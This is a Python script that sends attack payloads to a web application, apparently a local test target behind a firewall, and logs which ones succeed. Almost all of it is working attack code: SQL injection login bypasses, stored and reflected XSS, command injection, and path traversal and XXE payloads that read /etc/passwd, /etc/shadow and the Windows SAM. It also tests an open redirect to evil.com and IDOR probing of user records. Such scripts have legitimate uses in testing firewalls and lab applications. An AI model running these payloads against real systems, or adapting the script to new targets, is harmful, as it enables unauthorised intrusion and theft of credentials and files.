"""
Attack Payload Test Script
Automated testing of all vulnerability endpoints with malicious payloads

This script tests:
- SQL Injection (login bypass)
- XSS (stored & reflected)
- Command Injection
- Path Traversal
- XXE (XML External Entity)
- Open Redirect
- IDOR (Insecure Direct Object Reference)

Usage:
    python tests/test_attack_payloads.py

Output:
    - Console output with test results
    - CSV log: tests/logs/attack_traffic.csv
    - Exploitation success report
"""
# Please add options to specify the target and to only select one attack

import requests
import random
import time
import csv
import json
from datetime import datetime
from pathlib import Path

# Configuration
BASE_URL = "http://127.0.0.1:8081"  # Change to VM2 IP when testing through NGFW
OUTPUT_DIR = Path(__file__).parent / "logs"
OUTPUT_FILE = OUTPUT_DIR / "attack_traffic.csv"

# User agent
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"


class AttackPayloadTester:
    """Test all vulnerability endpoints with attack payloads"""
    
    def __init__(self, base_url=BASE_URL):
        self.base_url = base_url
        self.session = requests.Session()
        self.results = []
        self.test_count = 0
        
        # Create output directory
        OUTPUT_DIR.mkdir(exist_ok=True)
    
    def log_test(self, vulnerability, payload, endpoint, status_code, exploited, details=""):
        """Log test result"""
        self.test_count += 1
        result = {
            "timestamp": datetime.now().isoformat(),
            "test_number": self.test_count,
            "vulnerability": vulnerability,
            "payload": payload[:100],  # Truncate long payloads
            "endpoint": endpoint,
            "status_code": status_code,
            "exploited": exploited,
            "details": details[:200]  # Truncate long details
        }
        self.results.append(result)
        
        status = "✓ EXPLOITED" if exploited else "✗ BLOCKED"
        print(f"[{self.test_count}] {status} - {vulnerability}: {payload[:50]}...")
    
    def test_sql_injection(self):
        """Test 1: SQL Injection - Login Bypass"""
        print("\n" + "="*60)
        print("[TEST 1] SQL INJECTION - Login Bypass")
        print("="*60)
        
        sql_payloads = [
            "' OR '1'='1'--",
            "' OR 1=1--",
            "admin' OR '1'='1",
            "' OR 'a'='a",
            "admin'--",
            "' UNION SELECT NULL--",
            "1' OR '1'='1' /*",
            "admin' #",
            "' OR 1=1 LIMIT 1--",
            "') OR ('1'='1",
        ]
        
        for payload in sql_payloads:
            try:
                data = {
                    "username": payload,
                    "password": "anything"
                }
                
                response = self.session.post(
                    f"{self.base_url}/login",
                    data=data,
                    headers={"User-Agent": USER_AGENT},
                    timeout=10,
                    allow_redirects=False
                )
                
                # Check if login was successful (redirect or success message)
                exploited = (
                    response.status_code == 302 or
                    "welcome" in response.text.lower() or
                    "dashboard" in response.text.lower() or
                    "logged in" in response.text.lower()
                )
                
                details = "Login successful" if exploited else "Login failed"
                self.log_test("SQL Injection", payload, "/login", response.status_code, exploited, details)
                
                time.sleep(0.5)
            except Exception as e:
                self.log_test("SQL Injection", payload, "/login", 0, False, str(e))
    
    def test_xss_stored(self):
        """Test 2: Stored XSS - Feedback Form"""
        print("\n" + "="*60)
        print("[TEST 2] STORED XSS - Feedback Form")
        print("="*60)
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
        ]
        
        for payload in xss_payloads:
            try:
                data = {
                    "name": "Attacker",
                    "message": payload
                }
                
                response = self.session.post(
                    f"{self.base_url}/feedback",
                    data=data,
                    headers={"User-Agent": USER_AGENT},
                    timeout=10
                )
                
                # Check if payload was stored (status 200 or 302)
                exploited = response.status_code in [200, 302]
                
                # Verify payload is in response (stored)
                if exploited:
                    verify_response = self.session.get(f"{self.base_url}/feedback")
                    if payload in verify_response.text:
                        details = "Payload stored and rendered without sanitization"
                    else:
                        details = "Payload stored but may be sanitized"
                        exploited = False
                else:
                    details = "Payload rejected"
                
                self.log_test("Stored XSS", payload, "/feedback", response.status_code, exploited, details)
                
                time.sleep(0.5)
            except Exception as e:
                self.log_test("Stored XSS", payload, "/feedback", 0, False, str(e))
    
    def test_xss_reflected(self):
        """Test 3: Reflected XSS - Search Function"""
        print("\n" + "="*60)
        print("[TEST 3] REFLECTED XSS - Search Function")
        print("="*60)
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
        ]
        
        for payload in xss_payloads:
            try:
                params = {"search": payload}
                
                response = self.session.get(
                    f"{self.base_url}/feedback",
                    params=params,
                    headers={"User-Agent": USER_AGENT},
                    timeout=10
                )
                
                # Check if payload is reflected in response without encoding
                exploited = payload in response.text and response.status_code == 200
                
                details = "Payload reflected without sanitization" if exploited else "Payload sanitized or not reflected"
                self.log_test("Reflected XSS", payload, "/feedback?search=...", response.status_code, exploited, details)
                
                time.sleep(0.5)
            except Exception as e:
                self.log_test("Reflected XSS", payload, "/feedback?search=...", 0, False, str(e))
    
    def test_command_injection(self):
        """Test 4: Command Injection"""
        print("\n" + "="*60)
        print("[TEST 4] COMMAND INJECTION")
        print("="*60)
        
        # Windows and Linux command injection payloads
        cmd_payloads = [
            "; whoami",
            "| whoami",
            "& whoami",
            "`whoami`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| type C:\\Windows\\win.ini",
            "127.0.0.1; dir",
            "127.0.0.1 && dir",
            "8.8.8.8; ls -la",
        ]
        
        for payload in cmd_payloads:
            try:
                data = {"host": payload}
                
                response = self.session.post(
                    f"{self.base_url}/cmd",
                    json=data,
                    headers={
                        "User-Agent": USER_AGENT,
                        "Content-Type": "application/json"
                    },
                    timeout=15
                )
                
                # Check if command was executed (look for typical command output)
                response_text = response.text.lower()
                exploited = (
                    response.status_code == 200 and (
                        "root:" in response_text or  # /etc/passwd
                        "administrator" in response_text or  # Windows users
                        "system32" in response_text or  # Windows paths
                        "total " in response_text or  # ls output
                        "directory of" in response_text  # dir output
                    )
                )
                
                details = "Command executed successfully" if exploited else "Command blocked or failed"
                self.log_test("Command Injection", payload, "/cmd", response.status_code, exploited, details)
                
                time.sleep(0.5)
            except Exception as e:
                self.log_test("Command Injection", payload, "/cmd", 0, False, str(e))
    
    def test_path_traversal(self):
        """Test 5: Path Traversal / LFI"""
        print("\n" + "="*60)
        print("[TEST 5] PATH TRAVERSAL / LFI")
        print("="*60)
        
        lfi_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
            "/etc/shadow",
            "C:\\Windows\\win.ini",
            "../../../../var/log/apache2/access.log",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\..\\Windows\\System32\\config\\sam",
        ]
        
        for payload in lfi_payloads:
            try:
                data = {"filename": payload}
                
                response = self.session.post(
                    f"{self.base_url}/file",
                    json=data,
                    headers={
                        "User-Agent": USER_AGENT,
                        "Content-Type": "application/json"
                    },
                    timeout=10
                )
                
                # Check if file content was read
                response_text = response.text.lower()
                exploited = (
                    response.status_code == 200 and (
                        "root:" in response_text or  # /etc/passwd
                        "[extensions]" in response_text or  # win.ini
                        "localhost" in response_text or  # hosts file
                        "content" in response.json().get("content", "").lower() if response.headers.get("content-type", "").startswith("application/json") else False
                    )
                )
                
                details = "File read successfully" if exploited else "File access blocked"
                self.log_test("Path Traversal", payload, "/file", response.status_code, exploited, details)
                
                time.sleep(0.5)
            except Exception as e:
                self.log_test("Path Traversal", payload, "/file", 0, False, str(e))
    
    def test_xxe(self):
        """Test 6: XXE (XML External Entity)"""
        print("\n" + "="*60)
        print("[TEST 6] XXE (XML External Entity)")
        print("="*60)
        
        xxe_payloads = [
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><data>&xxe;</data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><data>&xxe;</data>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><user>&xxe;</user>',
        ]
        
        for payload in xxe_payloads:
            try:
                data = {"xml": payload}
                
                response = self.session.post(
                    f"{self.base_url}/api/xml",
                    json=data,
                    headers={
                        "User-Agent": USER_AGENT,
                        "Content-Type": "application/json"
                    },
                    timeout=10
                )
                
                # Check if external entity was processed
                response_text = response.text.lower()
                exploited = (
                    response.status_code == 200 and (
                        "root:" in response_text or  # /etc/passwd
                        "[extensions]" in response_text or  # win.ini
                        "localhost" in response_text  # hosts file
                    )
                )
                
                details = "External entity processed" if exploited else "XXE blocked or failed"
                self.log_test("XXE", payload[:80], "/api/xml", response.status_code, exploited, details)
                
                time.sleep(0.5)
            except Exception as e:
                self.log_test("XXE", payload[:80], "/api/xml", 0, False, str(e))
    
    def test_open_redirect(self):
        """Test 7: Open Redirect"""
        print("\n" + "="*60)
        print("[TEST 7] OPEN REDIRECT")
        print("="*60)
        
        redirect_payloads = [
            "http://evil.com",
            "//evil.com",
            "///evil.com",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
        ]
        
        for payload in redirect_payloads:
            try:
                params = {"url": payload}
                
                response = self.session.get(
                    f"{self.base_url}/redirect",
                    params=params,
                    headers={"User-Agent": USER_AGENT},
                    timeout=10,
                    allow_redirects=False
                )
                
                # Check if redirect occurred
                exploited = (
                    response.status_code in [301, 302, 303, 307, 308] and
                    payload in response.headers.get("Location", "")
                )
                
                details = f"Redirected to {payload}" if exploited else "Redirect blocked"
                self.log_test("Open Redirect", payload, "/redirect", response.status_code, exploited, details)
                
                time.sleep(0.5)
            except Exception as e:
                self.log_test("Open Redirect", payload, "/redirect", 0, False, str(e))
    
    def test_idor(self):
        """Test 8: IDOR (Insecure Direct Object Reference)"""
        print("\n" + "="*60)
        print("[TEST 8] IDOR (Insecure Direct Object Reference)")
        print("="*60)
        
        # Test accessing other users' data
        user_ids = [1, 2, 3, 999, -1]
        
        for user_id in user_ids:
            try:
                response = self.session.get(
                    f"{self.base_url}/user/{user_id}",
                    headers={"User-Agent": USER_AGENT},
                    timeout=10
                )
                
                # Check if user data was accessed without authorization
                exploited = (
                    response.status_code == 200 and
                    ("username" in response.text.lower() or "email" in response.text.lower())
                )
                
                details = f"Accessed user {user_id} data" if exploited else "Access denied or user not found"
                self.log_test("IDOR", f"user_id={user_id}", f"/user/{user_id}", response.status_code, exploited, details)
                
                time.sleep(0.5)
            except Exception as e:
                self.log_test("IDOR", f"user_id={user_id}", f"/user/{user_id}", 0, False, str(e))
    
    def save_results(self):
        """Save results to CSV"""
        print(f"\n[Saving Results] Writing to {OUTPUT_FILE}")
        
        with open(OUTPUT_FILE, 'w', newline='', encoding='utf-8') as csvfile:
            if self.results:
                fieldnames = self.results[0].keys()
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerows(self.results)
        
        print(f"✓ Results saved to {OUTPUT_FILE}")
    
    def print_summary(self):
        """Print test summary"""
        print("\n" + "="*60)
        print("ATTACK PAYLOAD TEST SUMMARY")
        print("="*60)
        
        total = len(self.results)
        exploited = sum(1 for r in self.results if r["exploited"])
        blocked = total - exploited
        
        if total > 0:
            exploit_rate = (exploited / total) * 100
            
            print(f"Total Payloads Tested: {total}")
            print(f"Successfully Exploited: {exploited} ({exploit_rate:.1f}%)")
            print(f"Blocked/Failed:        {blocked}")
            print()
            
            # Breakdown by vulnerability type
            vuln_types = {}
            for r in self.results:
                vuln = r["vulnerability"]
                if vuln not in vuln_types:
                    vuln_types[vuln] = {"total": 0, "exploited": 0}
                vuln_types[vuln]["total"] += 1
                if r["exploited"]:
                    vuln_types[vuln]["exploited"] += 1
            
            print("Breakdown by Vulnerability Type:")
            print("-" * 60)
            for vuln, stats in vuln_types.items():
                rate = (stats["exploited"] / stats["total"]) * 100 if stats["total"] > 0 else 0
                print(f"{vuln:25} {stats['exploited']:3}/{stats['total']:3} ({rate:5.1f}%)")
        
        print("="*60)
    
    def run_all_tests(self):
        """Run all attack payload tests"""
        print("="*60)
        print("ATTACK PAYLOAD TESTER")
        print("="*60)
        print(f"Target: {self.base_url}")
        print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*60)
        
        # Run all vulnerability tests
        self.test_sql_injection()
        self.test_xss_stored()
        self.test_xss_reflected()
        self.test_command_injection()
        self.test_path_traversal()
        self.test_xxe()
        self.test_open_redirect()
        self.test_idor()
        
        # Save results and print summary
        self.save_results()
        self.print_summary()


def main():
    """Main function"""
    tester = AttackPayloadTester()
    tester.run_all_tests()


if __name__ == "__main__":
    main()
